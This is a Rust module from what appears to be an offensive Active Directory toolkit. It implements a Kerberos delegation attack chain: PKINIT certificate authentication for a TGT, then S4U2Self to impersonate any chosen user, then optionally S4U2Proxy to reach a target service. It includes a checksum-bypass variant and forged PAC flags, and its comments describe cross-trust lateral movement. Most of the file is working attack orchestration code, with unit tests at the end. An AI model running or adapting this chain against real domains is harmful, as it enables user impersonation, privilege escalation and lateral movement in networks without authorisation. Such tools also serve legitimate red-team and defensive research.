//! S4U2Self with PKINIT Certificate Chain
//!
//! Performs certificate-based S4U2Self delegation for cross-trust lateral movement.
//! This chain allows:
//! 1. Authenticate via PKINIT (client certificate) → obtain TGT
//! 2. Use TGT for S4U2Self → impersonate any user to self
//! 3. Optionally chain to S4U2Proxy → access target service
//!
//! Use case: When you have a user's PKINIT certificate but need to
//! impersonate other users or access services across trust boundaries.
//! This is especially useful for cross-trust attacks where password-based
//! auth may be blocked but certificate-based auth is allowed.

use overthrone_core::error::Result;
use overthrone_core::proto::kerberos;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

/// Configuration for S4U2Self-with-PKINIT chain
#[derive(Debug, Clone, Default)]
pub struct S4U2SelfPkinitConfig {
    /// Domain controller IP
    pub dc_ip: String,
    /// Domain/realm
    pub domain: String,
    /// Username for PKINIT authentication
    pub username: String,
    /// Path to PEM-encoded client certificate
    pub cert_path: String,
    /// Path to PEM-encoded private key
    pub key_path: String,
    /// User to impersonate via S4U2Self
    pub impersonate_user: String,
    /// Target SPN for S4U2Proxy (optional)
    /// If set, chains S4U2Self → S4U2Proxy
    pub target_spn: Option<String>,
    /// Enable checksum bypass for constrained delegation
    /// May be required for some delegation configurations
    pub checksum_bypass: bool,
    /// PAC flags to set in forged ticket (optional)
    pub pac_flags: Option<u32>,
}

/// Result of S4U2Self-with-PKINIT chain
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct S4U2SelfPkinitResult {
    /// Username used for PKINIT
    pub pkinit_user: String,
    /// User impersonated via S4U2Self
    pub impersonated_user: String,
    /// TGT obtained via PKINIT (success/fail)
    pub pkinit_success: bool,
    /// S4U2Self success (success/fail)
    pub s4u2self_success: bool,
    /// S4U2Proxy success (if target_spn was set)
    pub s4u2proxy_success: bool,
    /// Final service ticket data (ASN.1 DER)
    pub final_ticket_data: Vec<u8>,
    /// Session key from final ticket
    pub session_key: Vec<u8>,
    /// Ticket expiry
    pub ticket_expiry: String,
    /// Target SPN (if S4U2Proxy was performed)
    pub target_spn: Option<String>,
    /// Overall chain success
    pub chain_success: bool,
    /// Error message (if any step failed)
    pub error: Option<String>,
}

/// Execute S4U2Self with PKINIT authentication chain
pub async fn run_s4u2self_pkinit(config: &S4U2SelfPkinitConfig) -> Result<S4U2SelfPkinitResult> {
    info!(
        "Starting S4U2Self+PKINIT chain: {}@{} → {} → {:?}",
        config.username, config.domain, config.impersonate_user, config.target_spn
    );

    let mut result = S4U2SelfPkinitResult {
        pkinit_user: config.username.clone(),
        impersonated_user: config.impersonate_user.clone(),
        pkinit_success: false,
        s4u2self_success: false,
        s4u2proxy_success: false,
        final_ticket_data: Vec::new(),
        session_key: Vec::new(),
        ticket_expiry: String::new(),
        target_spn: config.target_spn.clone(),
        chain_success: false,
        error: None,
    };

    // Step 1: Authenticate via PKINIT to obtain TGT
    info!(
        "  Step 1: PKINIT authentication as {}@{}",
        config.username, config.domain
    );

    let tgt = match crate::pkinit_auth::pkinit_authenticate(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.cert_path,
        &config.key_path,
    )
    .await
    {
        Ok(tgt) => {
            result.pkinit_success = true;
            info!("  ✓ PKINIT authentication succeeded");
            tgt
        }
        Err(e) => {
            result.error = Some(format!("PKINIT authentication failed: {}", e));
            warn!("  ✗ PKINIT failed: {}", e);
            return Ok(result);
        }
    };

    // Step 2: Perform S4U2Self to impersonate target user
    info!(
        "  Step 2: S4U2Self impersonation of {}",
        config.impersonate_user
    );

    let s4u_ticket = if config.checksum_bypass {
        // Use checksum bypass variant
        match kerberos::s4u2self_with_checksum_bypass(
            &config.dc_ip,
            &tgt,
            &config.impersonate_user,
            config.pac_flags,
            None, // custom_checksum
        )
        .await
        {
            Ok((ticket, had_bypass)) => {
                result.s4u2self_success = true;
                info!("  ✓ S4U2Self succeeded (checksum bypass: {})", had_bypass);
                ticket
            }
            Err(e) => {
                result.error = Some(format!("S4U2Self failed: {}", e));
                warn!("  ✗ S4U2Self failed: {}", e);
                return Ok(result);
            }
        }
    } else {
        // Standard S4U2Self
        match kerberos::s4u2self(&config.dc_ip, &tgt, &config.impersonate_user).await {
            Ok(ticket) => {
                result.s4u2self_success = true;
                info!("  ✓ S4U2Self succeeded");
                ticket
            }
            Err(e) => {
                result.error = Some(format!("S4U2Self failed: {}", e));
                warn!("  ✗ S4U2Self failed: {}", e);
                return Ok(result);
            }
        }
    };

    // Step 3: Optionally chain to S4U2Proxy for target service
    if let Some(target_spn) = &config.target_spn {
        info!("  Step 3: S4U2Proxy to {}", target_spn);

        match kerberos::request_service_ticket(&config.dc_ip, &s4u_ticket, target_spn).await {
            Ok(service_ticket) => {
                result.s4u2proxy_success = true;
                result.final_ticket_data = service_ticket.ticket.enc_part.cipher.clone();
                result.session_key = service_ticket.session_key.clone();
                result.ticket_expiry = if let Some(end_time) = &service_ticket.end_time {
                    end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
                } else {
                    "Unknown".to_string()
                };
                info!("  ✓ S4U2Proxy succeeded for {}", target_spn);
            }
            Err(e) => {
                result.error = Some(format!("S4U2Proxy failed: {}", e));
                warn!("  ✗ S4U2Proxy failed for {}: {}", target_spn, e);
                // S4U2Self succeeded but S4U2Proxy failed
                // Return partial success with S4U2Self ticket
                result.final_ticket_data = s4u_ticket.ticket.enc_part.cipher.clone();
                result.session_key = s4u_ticket.session_key.clone();
                result.ticket_expiry = if let Some(end_time) = &s4u_ticket.end_time {
                    end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
                } else {
                    "Unknown".to_string()
                };
                return Ok(result);
            }
        }
    } else {
        // No S4U2Proxy requested, use S4U2Self ticket
        result.final_ticket_data = s4u_ticket.ticket.enc_part.cipher.clone();
        result.session_key = s4u_ticket.session_key.clone();
        result.ticket_expiry = if let Some(end_time) = &s4u_ticket.end_time {
            end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
        } else {
            "Unknown".to_string()
        };
    }

    // Determine overall success
    result.chain_success = if config.target_spn.is_some() {
        result.pkinit_success && result.s4u2self_success && result.s4u2proxy_success
    } else {
        result.pkinit_success && result.s4u2self_success
    };

    if result.chain_success {
        info!(
            "  ✓ Full chain succeeded: {} → {} → {:?}",
            config.username, config.impersonate_user, config.target_spn
        );
    } else {
        warn!("  ⚠ Chain partially succeeded (check individual step results)");
    }

    Ok(result)
}

/// Quick helper: S4U2Self-only (no S4U2Proxy) with PKINIT
pub async fn s4u2self_pkinit_only(
    dc_ip: &str,
    domain: &str,
    username: &str,
    cert_path: &str,
    key_path: &str,
    impersonate_user: &str,
) -> Result<S4U2SelfPkinitResult> {
    let config = S4U2SelfPkinitConfig {
        dc_ip: dc_ip.to_string(),
        domain: domain.to_string(),
        username: username.to_string(),
        cert_path: cert_path.to_string(),
        key_path: key_path.to_string(),
        impersonate_user: impersonate_user.to_string(),
        ..Default::default()
    };

    run_s4u2self_pkinit(&config).await
}

/// Full chain: PKINIT → S4U2Self → S4U2Proxy
pub async fn s4u2self_pkinit_with_proxy(
    dc_ip: &str,
    domain: &str,
    username: &str,
    cert_path: &str,
    key_path: &str,
    impersonate_user: &str,
    target_spn: &str,
) -> Result<S4U2SelfPkinitResult> {
    let config = S4U2SelfPkinitConfig {
        dc_ip: dc_ip.to_string(),
        domain: domain.to_string(),
        username: username.to_string(),
        cert_path: cert_path.to_string(),
        key_path: key_path.to_string(),
        impersonate_user: impersonate_user.to_string(),
        target_spn: Some(target_spn.to_string()),
        ..Default::default()
    };

    run_s4u2self_pkinit(&config).await
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_default() {
        let config = S4U2SelfPkinitConfig::default();
        assert!(config.dc_ip.is_empty());
        assert!(config.target_spn.is_none());
        assert!(!config.checksum_bypass);
        assert!(config.pac_flags.is_none());
    }

    #[test]
    fn test_config_with_spn() {
        let config = S4U2SelfPkinitConfig {
            dc_ip: "192.168.1.10".to_string(),
            domain: "corp.local".to_string(),
            username: "user1".to_string(),
            cert_path: "/tmp/cert.pem".to_string(),
            key_path: "/tmp/key.pem".to_string(),
            impersonate_user: "admin".to_string(),
            target_spn: Some("cifs/dc01.corp.local".to_string()),
            checksum_bypass: true,
            pac_flags: Some(0x20000000),
        };

        assert_eq!(config.dc_ip, "192.168.1.10");
        assert_eq!(config.target_spn.unwrap(), "cifs/dc01.corp.local");
        assert!(config.checksum_bypass);
        assert_eq!(config.pac_flags.unwrap(), 0x20000000);
    }

    #[test]
    fn test_result_serialization() {
        let result = S4U2SelfPkinitResult {
            pkinit_user: "user1".to_string(),
            impersonated_user: "admin".to_string(),
            pkinit_success: true,
            s4u2self_success: true,
            s4u2proxy_success: false,
            final_ticket_data: vec![1, 2, 3],
            session_key: vec![4, 5, 6],
            ticket_expiry: "2024-12-31 23:59:59 UTC".to_string(),
            target_spn: None,
            chain_success: true,
            error: None,
        };

        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("user1"));
        assert!(json.contains("admin"));
        assert!(json.contains("chain_success\":true"));
    }

    #[test]
    fn test_result_deserialization() {
        let json = r#"{
            "pkinit_user": "test",
            "impersonated_user": "admin",
            "pkinit_success": true,
            "s4u2self_success": true,
            "s4u2proxy_success": false,
            "final_ticket_data": [],
            "session_key": [],
            "ticket_expiry": "Unknown",
            "target_spn": null,
            "chain_success": true,
            "error": null
        }"#;

        let result: S4U2SelfPkinitResult = serde_json::from_str(json).unwrap();
        assert_eq!(result.pkinit_user, "test");
        assert!(result.pkinit_success);
        assert!(result.chain_success);
    }

    #[test]
    fn test_result_with_error() {
        let result = S4U2SelfPkinitResult {
            pkinit_user: "user1".to_string(),
            impersonated_user: "admin".to_string(),
            pkinit_success: false,
            s4u2self_success: false,
            s4u2proxy_success: false,
            final_ticket_data: Vec::new(),
            session_key: Vec::new(),
            ticket_expiry: String::new(),
            target_spn: None,
            chain_success: false,
            error: Some("PKINIT authentication failed: cert not found".to_string()),
        };

        assert!(!result.chain_success);
        assert!(result.error.is_some());
        assert_eq!(
            result.error.as_ref().unwrap(),
            "PKINIT authentication failed: cert not found"
        );
    }

    #[test]
    fn test_result_partial_success() {
        let result = S4U2SelfPkinitResult {
            pkinit_user: "user1".to_string(),
            impersonated_user: "admin".to_string(),
            pkinit_success: true,
            s4u2self_success: true,
            s4u2proxy_success: false,
            final_ticket_data: vec![1, 2, 3],
            session_key: vec![4, 5, 6],
            ticket_expiry: "2024-12-31 23:59:59 UTC".to_string(),
            target_spn: Some("cifs/dc01.corp.local".to_string()),
            chain_success: false,
            error: Some("S4U2Proxy failed: access denied".to_string()),
        };

        // S4U2Self succeeded but S4U2Proxy failed
        assert!(result.pkinit_success);
        assert!(result.s4u2self_success);
        assert!(!result.s4u2proxy_success);
        assert!(!result.chain_success);
        assert_eq!(result.target_spn.as_ref().unwrap(), "cifs/dc01.corp.local");
    }

    #[test]
    fn test_config_clone_and_debug() {
        let config = S4U2SelfPkinitConfig {
            dc_ip: "10.0.0.1".to_string(),
            domain: "test.local".to_string(),
            username: "testuser".to_string(),
            cert_path: "/tmp/test.pem".to_string(),
            key_path: "/tmp/test.key".to_string(),
            impersonate_user: "target".to_string(),
            target_spn: Some("ldap/dc01.test.local".to_string()),
            checksum_bypass: false,
            pac_flags: None,
        };

        // Test Clone
        let config2 = config.clone();
        assert_eq!(config.dc_ip, config2.dc_ip);
        assert_eq!(config.domain, config2.domain);
        assert_eq!(config.impersonate_user, config2.impersonate_user);

        // Test Debug
        let debug_str = format!("{:?}", config);
        assert!(debug_str.contains("S4U2SelfPkinitConfig"));
        assert!(debug_str.contains("10.0.0.1"));
    }
}
